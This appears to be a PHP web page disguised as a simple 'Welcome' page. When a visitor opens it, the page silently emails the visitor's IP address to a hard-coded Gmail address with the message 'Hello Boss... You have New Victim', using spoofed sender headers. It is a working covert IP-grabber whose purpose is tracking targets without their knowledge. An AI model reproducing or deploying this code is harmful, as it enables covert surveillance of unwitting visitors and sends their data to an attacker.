<html>
   
   <head>
      <title>Welcome</title>
   </head>
   
   <body>
    <style>
        body{
            padding: 0;
            margin: 0;
            background-color: black;
        }
        b{
            text-align: center;
            color: red;
        }
        h1{
            text-align: center;
            padding: 10px;
            background-color: blue;
            color: snow;
        }
    </style>   
      <?php
         $to = "kkingwizard7@gmail.com";
         $subject = "";
         $ip = $_SERVER['REMOTE_ADDR'];
         $message = "<b>Hello Boss</b>";
         $message .= "<h1>You have New Victim <br>$ip</h1>";
         
         $header = "From:victim@somedomain.com \r\n";
         $header .= "Cc:victim@somedomain.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail ($to,$subject,$message,$header);
         
         if( $retval == true ) {
            echo "<h1>Message sent successfully...</h1>";
         }else {
            echo "<h1>Message could not be sent...</h1>";
         }
      ?>
      
   </body>
</html>